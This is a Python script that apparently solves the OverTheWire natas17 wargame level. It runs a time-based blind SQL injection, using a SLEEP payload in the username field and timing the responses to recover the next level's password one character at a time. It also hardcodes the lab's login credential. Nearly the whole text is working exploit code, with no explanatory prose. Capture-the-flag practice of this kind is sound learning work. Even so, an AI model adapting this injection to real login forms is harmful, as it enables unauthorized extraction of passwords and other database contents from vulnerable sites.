import requests
import sys



charlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

target = 'http://natas17.natas.labs.overthewire.org/index.php?debug=1'

user_auth = ('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

payload = 'natas18" AND IF(password LIKE BINARY "{0}{1}%",SLEEP(1),0)#'

# wittle down the list of characters

tarlist = ''

print("Checking which characters are present:\n")
print(charlist),
sys.stdout.flush()
dplist = ''



for stinger in range(0, len(charlist)):
    #print("Testing: " + charlist[stinger])
    if requests.post(target, auth=user_auth,
        data = {'username':payload.format("%",charlist[stinger])})\
        .elapsed.total_seconds() > 1 :
        tarlist += charlist[stinger]
        dplist += charlist[stinger]
    else:
        dplist += "_"

    print("\r"+dplist+charlist[stinger+1:]),
    sys.stdout.flush()

print("\n\nHere's the final character list:")
print(tarlist)

print("-" * 60 + "\n")


tarlist = list(tarlist)

pwdString = ''
for cmpl in range(0,32):


    #print(pwdString + "_" * (31-cmpl))
    for i in range(0, len(tarlist)):
        response = requests.post(target, auth = user_auth,
            data = {'username':payload.format(pwdString,tarlist[i])})
        #print(response.text)
        #print payload.format(pwdString, charlist[i])
        print(pwdString + tarlist[i] + "_" * (31-cmpl)),
        print(response.elapsed.total_seconds()),
        print("\r"),
        sys.stdout.flush()
        if response.elapsed.total_seconds() > 1 :
            tmp = tarlist.pop(i)
            pwdString += tmp
            tarlist.append(tmp)
            #print("Found a new character!")
            break


print("\n" + "-" * 60 + "\n")
print("The final password string is:")
print(pwdString)
